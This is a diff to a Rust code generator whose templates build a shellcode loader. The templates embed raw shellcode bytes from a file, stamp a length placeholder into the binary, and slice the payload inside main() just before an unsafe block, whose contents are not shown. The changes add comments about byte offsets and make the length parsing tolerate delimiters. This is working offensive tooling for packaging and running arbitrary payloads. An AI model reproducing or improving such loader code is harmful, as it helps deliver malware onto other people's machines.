@@ -286,13 +286,19 @@ fn get_size_holder() -> &'static str {{
 
 #[inline(never)]
 fn get_shellcode() -> &'static [u8] {{
+    // After stamping, get_shellcode()[0] is byte 0 of your shellcode.
+    // The placeholder prefix is overwritten. Do NOT add any offset.
     black_box(include_bytes!("../shellcode"))
 }}
 
 fn shellcode_len() -> usize {{
+    // trim_matches strips the $$ delimiters so this works both pre-stamp
+    // ("{size_holder}" parses as 0 → harmless noop) and post-stamp
+    // ("000000460" parses as 460 → correct length).
     get_size_holder()
+        .trim_matches('$')
         .parse()
-        .expect("size holder must be a decimal length")
+        .unwrap_or(0)
 }}
 "##,
             size_holder = markers.size_holder,
@@ -319,6 +325,7 @@ use std::ptr;
 
 fn main() {{
     let len = shellcode_len();
+    // get_shellcode()[0] is byte 0 of the stamped shellcode — no offset needed.
     let sc = &get_shellcode()[..len];
 
     unsafe {{
@@ -422,6 +429,7 @@ use std::ptr;
 
 fn main() {{
     let len = shellcode_len();
+    // get_shellcode()[0] is byte 0 of the stamped shellcode — no offset needed.
     let sc = &get_shellcode()[..len];
 
     unsafe {{
